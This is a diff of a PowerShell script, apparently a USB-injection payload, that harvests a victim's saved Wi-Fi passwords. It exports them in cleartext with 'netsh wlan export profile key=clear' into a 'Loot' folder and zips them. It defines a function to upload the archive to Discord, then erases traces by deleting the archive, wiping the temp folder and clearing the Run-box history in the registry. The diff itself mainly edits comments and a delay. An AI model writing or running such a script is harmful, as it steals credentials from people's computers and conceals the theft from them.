@@ -1,14 +1,14 @@
-##### navigates to desktop of current user and creates folder in current directory #####
+##### navigates to temp directory of current user and creates folder #####
 
 cd $env:TEMP
 New-Item -Path . -Name "Loot" -ItemType "directory"
 
-##### save password files to the created directory #####
+##### save wifi password files to the created directory #####
 
 cd $env:TEMP\Loot
 netsh wlan export profile key=clear
 
-#####zip the folder#####
+##### compress into the folder #####
 
 $compress = @{
   Path = "$env:TEMP\Loot"
@@ -17,7 +17,7 @@ $compress = @{
 }
 Compress-Archive @compress
 
-#####Upload to Discord#####
+##### Upload to Discord Function #####
 
 function Upload-Discord {
 
@@ -50,14 +50,13 @@ cd $env:USERPROFILE
 ##### clean up crew #####
 
 #delay
-Start-Sleep -Seconds 3
+Start-Sleep -Seconds 2
 
 #delete created archive
 Remove-Item -Path $env:USERPROFILE\Desktop\Loot.zip
 
 #temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
 
 #run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVErsion\Explorer\RunRMU /va /f
